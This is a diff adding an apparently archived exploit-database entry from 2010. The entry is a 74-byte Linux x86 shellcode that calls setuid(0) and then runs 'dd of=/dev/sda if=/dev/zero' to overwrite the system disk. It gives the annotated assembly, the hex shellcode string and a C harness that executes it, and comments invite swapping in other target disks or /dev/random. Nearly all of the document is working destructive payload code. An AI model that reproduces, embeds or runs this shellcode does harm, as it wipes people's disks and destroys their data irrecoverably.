@@ -1,0 +1,74 @@
+id: 14166
+date: 09/24/2010
+title: linux/x86 setuid(0) and dd of=/dev/sda if=/dev/zero shellcode 74 bytes
+author: xertux
+cves: 
+
+======================================================================
+linux/x86 setuid(0) and dd of=/dev/sda if=/dev/zero shellcode 74 bytes
+======================================================================
+
+ /*
+  * Title : Linux x86 shellcode setuid(0) and dd of=/dev/sda if=/dev/zero, 74 bytes
+  * Author : xertux
+  * Platform: Linux X86 (7.04)
+  * Description : setuid(0) + dd of=/dev/sda if=/dev/zero
+  * Size : 74 bytes
+  * Decription : Use the dd command, we can change of and if argument to create, modify and destroy datas. Here the sda	disk is format.
+  * */
+
+ /**
+  *BITS 32
+  *;Get root privileges
+  *xor eax, eax
+  *xor ebx, ebx
+  *xor ecx, ecx
+  *cdq
+  *mov al, 0x17
+  *int 0x80
+  *;exceve(dd of=/dev/sda if=/dev/zero)
+  *xor eax, eax      ; eax become 0
+  *push eax          ; null string termination
+  *push 0x64642f2f   ; push //dd
+  *push 0x6e69622f   ; push /bin
+  *mov ebx, esp      ; put the address of "/bin//dd" into ebx
+  *push eax          ; push null string termination
+  *push 0x6164732f   ; push /sda
+  *push 0x2f766564   ; push dev/
+  *push 0x2f3d666f   ; push of=/
+  *mov ecx, esp      ; put the address of "of=/dev//sda" into ecx  ==> you can change to another disk or any files
+  *push eax          ; null string termination
+  *push 0x6f72657a   ; push zero
+  *push 0x2f766564   ; push dev/
+  *push 0x2f3d6669   ; push if=/
+  *mov edx, esp      ; put the address of "if=/dev/zero" into edx ==> you can try with /dev/random, it's funny ^^
+  *push eax          ; push null args termination
+  *push edx          ; push "if=/dev/zero"
+  *push ecx          ; push "of=/dev//sda"
+  *push ebx          ; push /bin//dd
+  *mov ecx, esp      ; argument array completed via esp
+  *xor edx, edx
+  *mov al, 0x0b      ; put the int execve call into al
+  *int 0x80          ; system call
+ */
+
+#include "stdio.h"
+
+ char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f"
+"\x2f\x64\x64\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2f\x73\x64\x61"
+"\x68\x64\x65\x76\x2f\x68\x6f\x66\x3d\x2f\x89\xe1\x50\x68\x7a\x65"
+"\x72\x6f\x68\x64\x65\x76\x2f\x68\x69\x66\x3d\x2f\x89\xe2\x50\x52"
+"\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";;
+
+ int main()
+{
+           printf(" [*] Shellcode - length: %d\n",strlen(shellcode));
+           (*(void(*)()) shellcode)();
+           return 0;
+}
+
+
+
+
+
+#  0day.today [2023-03-25]  #
